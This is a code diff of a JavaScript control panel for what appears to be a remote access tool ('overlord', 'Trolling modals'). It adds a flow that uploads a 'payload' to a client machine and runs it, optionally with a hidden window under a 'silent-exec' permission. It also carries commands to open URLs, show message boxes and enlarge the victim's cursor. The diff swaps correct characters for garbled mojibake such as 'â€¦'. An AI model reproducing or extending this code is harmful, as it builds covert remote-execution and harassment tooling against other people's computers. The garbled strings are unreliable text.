+            jobId: status.jobId,
+            displayName,
+            hideWindow: !!status.hideWindow || !!options.hideWindow,
+            args,
+            onDone,
+          });
+        });
+        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
+        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
+          btn.onclick = () => panel.remove();
+        });
+        return;
+      }
 
       if (status.status === "succeeded") {
         completed = true;
-        if (cancelBtn) cancelBtn.remove();
-        label.textContent = "Execution completed 100%";
-        bar.style.width = "100%";
-        setTimeout(() => {
-          cleanup();
-          showToast(`Executed successfully: ${file.name}`, "success", 6000);
-        }, 600);
+        clearRexReadyJob(clientId);
+        cleanupTimers();
+        onDone();
+        showRexPanelProgress(panel, {
+          label: "Execution completed 100%",
+          percent: 100,
+          metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes }),
+          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
+        });
+        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
+        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
+          btn.onclick = () => panel.remove();
+        });
+        showToast(`Executed successfully: ${displayName}`, "success", 6000);
         return;
       }
 
       if (status.status === "failed") {
         completed = true;
-        cleanup();
+        cleanupTimers();
+        onDone();
         if (status?.error?.code === "cancelled") {
+          panel.remove();
           showToast("Remote execute cancelled", "info");
-        } else {
-          showToast(remoteExecuteErrorText(status), "error", 12000);
+          return;
         }
+        showRexPanelProgress(panel, {
+          label: "Failed",
+          percent: Math.min(99, Number(status.percent) || 0),
+          metaHtml: `<pre class="sp-rex-error">${escapeHtml(remoteExecuteErrorText(status))}</pre>`,
+          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
+        });
+        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
+        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
+          btn.onclick = () => panel.remove();
+        });
         return;
       }
 
-      const interval = status.phase === "client_transfer"
-        ? REMOTE_EXECUTE_TRANSFER_POLL_MS
-        : REMOTE_EXECUTE_POLL_MS;
+      const interval =
+        status.phase === "client_transfer" ? REMOTE_EXECUTE_TRANSFER_POLL_MS : REMOTE_EXECUTE_POLL_MS;
       pollTimer = setTimeout(() => pollJob(jobId), interval);
     } catch (err) {
       if (completed) return;
       completed = true;
-      cleanup();
-      showToast(err.message || "Remote execute status polling failed", "error", 8000);
+      cleanupTimers();
+      onDone();
+      showRexPanelProgress(panel, {
+        label: "Failed",
+        percent: 0,
+        metaHtml: `<pre class="sp-rex-error">${escapeHtml(err.message || "Remote execute failed")}</pre>`,
+        actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
+      });
+      panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
     }
   }
+
+  if (options.kind === "execute") {
+    showRexPanelProgress(panel, {
+      label: "Starting executionâ€¦",
+      percent: 15,
+      metaHtml: `<div class="sp-progress-detail">${escapeHtml(options.displayName || "payload")}</div>`,
+      actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+    });
+    panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
+
+    const body = {};
+    if (options.args) body.args = options.args;
+    if (typeof options.hideWindow === "boolean") body.hideWindow = options.hideWindow;
+
+    fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(options.jobId)}/execute`, {
+      method: "POST",
+      credentials: "include",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body),
+    })
+      .then(async (res) => {
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) {
+          if (res.status === 404) clearRexReadyJob(clientId);
+          throw new Error(data.message || `Execute failed: ${res.status}`);
+        }
+        activeJobId = options.jobId;
+        pollJob(options.jobId);
+      })
+      .catch((err) => {
+        if (completed) return;
+        completed = true;
+        onDone();
+        showRexPanelProgress(panel, {
+          label: "Failed",
+          percent: 0,
+          metaHtml: `<pre class="sp-rex-error">${escapeHtml(err.message || "Failed to start execution")}</pre>`,
+          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
+        });
+        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
+      });
+
+    return { cancel: cancelRemoteExecute };
+  }
+
+  // Upload path
+  const file = options.file;
+  const mode = options.mode === "upload_only" ? "upload_only" : "upload_and_run";
+  const formData = new FormData();
+  formData.append("file", file);
+  formData.append("mode", mode);
+  if (options.args) formData.append("args", options.args);
+  if (options.hideWindow) formData.append("hideWindow", "true");
+
+  showRexPanelProgress(panel, {
+    label: "Preparing remote executeâ€¦",
+    percent: 0,
+    metaHtml: `<div class="sp-progress-detail">${escapeHtml(file.name)}</div>`,
+    actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+  });
+  panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
+
+  xhr.upload.addEventListener("progress", (e) => {
+    if (!e.lengthComputable || completed) return;
+    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
+    showRexPanelProgress(panel, {
+      label: `Host to serverâ€¦ ${pct}%`,
+      percent: Math.min(10, Math.floor(pct * 0.1)),
+      metaHtml: `
+        <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
+        <div class="sp-progress-detail">Staging before client transfer</div>
+      `,
+      actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+    });
+    panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
+  });
 
   xhr.addEventListener("load", () => {
     if (completed) return;
@@ -716,55 +1082,81 @@ function uploadRemoteExecute(clientId, file, options = {}) {
         const res = JSON.parse(xhr.responseText);
         if (res.ok && res.jobId) {
           activeJobId = res.jobId;
-          bar.style.width = `${Math.max(0, Number(res.percent) || 0)}%`;
-          label.textContent = "Waiting for client\u2026 0%";
-          meta.innerHTML = `
-            <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)} · waiting\u2026</div>
-            <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}</div>
-          `;
+          const stagedPct = Math.max(10, Math.min(15, Number(res.percent) || 10));
+          const ver = res.clientVersion ? ` Â· agent v${res.clientVersion}` : "";
+          showRexPanelProgress(panel, {
+            label: `Waiting for clientâ€¦ ${stagedPct}%`,
+            percent: stagedPct,
+            metaHtml: `
+              <div class="sp-progress-detail">${escapeHtml(file.name)} Â· staged ${formatBytes(res.totalBytes || file.size)} Â· waiting for client pullâ€¦</div>
+              <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}${escapeHtml(ver)}</div>
+              <div class="sp-progress-detail">Mode: ${escapeHtml(mode === "upload_only" ? "upload only" : "upload & run")}</div>
+            `,
+            actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+          });
+          panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
           pollJob(res.jobId);
         } else {
           completed = true;
-          cleanup();
-          showToast(res.message || "Remote execute failed", "error", 8000);
+          onDone();
+          showRexPanelProgress(panel, {
+            label: "Failed",
+            percent: 0,
+            metaHtml: `<pre class="sp-rex-error">${escapeHtml(res.message || "Remote execute failed")}</pre>`,
+            actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
+          });
+          panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
         }
       } catch {
         completed = true;
-        cleanup();
+        onDone();
         showToast("Remote execute response was not valid JSON", "error", 6000);
+        panel.remove();
       }
     } else {
       let msg = "Upload failed";
-      try { msg = JSON.parse(xhr.responseText).message || msg; } catch {}
+      try {
+        msg = JSON.parse(xhr.responseText).message || msg;
+      } catch {
+        /* ignore */
+      }
       if (xhr.status === 403) msg = "Permission denied (requires silent-exec)";
       completed = true;
-      cleanup();
-      showToast(msg, "error", 8000);
+      onDone();
+      showRexPanelProgress(panel, {
+        label: "Failed",
+        percent: 0,
+        metaHtml: `<pre class="sp-rex-error">${escapeHtml(msg)}</pre>`,
+        actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
+      });
+      panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
     }
   });
 
   xhr.addEventListener("error", () => {
     if (completed) return;
     completed = true;
-    cleanup();
+    onDone();
     showToast("Network error during upload", "error");
+    panel.remove();
   });
 
   xhr.addEventListener("abort", () => {
     if (completed) return;
     completed = true;
-    cleanup();
-    showToast("Upload cancelled", "info");
+    onDone();
   });
 
   xhr.open("POST", `/api/clients/${clientId}/remote-execute`);
   xhr.withCredentials = true;
   xhr.send(formData);
+
+  return { cancel: cancelRemoteExecute };
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Trolling modals                                            */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 function closeSpModal(overlay) {
   if (overlay && overlay.parentNode) overlay.remove();
@@ -875,7 +1267,7 @@ async function openOpenUrlModal(clientId) {
     return;
   }
 
-  showToast(`Opening ${normalized.url}…`, "info", 2500);
+  showToast(`Opening ${normalized.url}â€¦`, "info", 2500);
   try {
     const result = await sendCommand(clientId, "open_url", { url: normalized.url });
     if (result && result.ok === false) {
@@ -920,7 +1312,7 @@ async function openMessageBoxModal(clientId) {
     return;
   }
 
-  showToast("Showing message box…", "info", 2500);
+  showToast("Showing message boxâ€¦", "info", 2500);
   try {
     const result = await sendCommand(clientId, "message_box", { title, text, icon });
     if (result && result.ok === false) {
@@ -964,11 +1356,11 @@ async function openBigMouseModal(clientId) {
 
   const durationSec = Math.floor(Number(body.querySelector("[data-sp-duration]")?.value || 30));
   if (!Number.isFinite(durationSec) || durationSec < 5 || durationSec > 300) {
-    showToast("Duration must be 5–300 seconds", "error");
+    showToast("Duration must be 5â€“300 seconds", "error");
     return;
   }
 
-  showToast(`Making cursor huge for ${durationSec}s…`, "info", 2500);
+  showToast(`Making cursor huge for ${durationSec}sâ€¦`, "info", 2500);
   try {
     const result = await sendCommand(clientId, "cursor_big", { durationSec });
     if (result && result.ok === false) {
@@ -981,9 +1373,9 @@ async function openBigMouseModal(clientId) {
   }
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Action handler                                             */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 async function handleAction(clientId, action) {
   playClickSound();
@@ -1057,9 +1449,9 @@ async function handleAction(clientId, action) {
   }
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Dynamic sections (scripts & plugins)                       */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 async function loadScripts() {
   try {
@@ -1083,9 +1475,9 @@ async function loadPlugins(clientId) {
   }
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  DOM builder                                                */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 function buildPanel(clientId) {
   const panel = document.createElement("div");
@@ -1147,6 +1539,17 @@ function buildPanel(clientId) {
         btn.addEventListener("click", () => openFileBrowserWindow(clientId));
       } else if (item.open === "files-classic") {
         btn.addEventListener("click", () => openFileBrowserWindow(clientId, "classic"));
+      } else if (item.open === "soundboard-remote") {
+        btn.addEventListener("click", () => {
+          const url = resolveOpenUrl(clientId, item.open);
+          if (url) {
+            window.open(
+              url,
+              `overlord-soundboard-${clientId}`,
+              "width=420,height=640,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes",
+            );
+          }
+        });
       } else if (item.open) {
         btn.addEventListener("click", () => {
           const url = resolveOpenUrl(clientId, item.open);
@@ -1237,9 +1640,9 @@ function escapeHtml(str) {
   return d.innerHTML;
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Public init                                                */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 export function initSidePanel(clientId, containerEl) {
   if (!clientId || !containerEl) return;
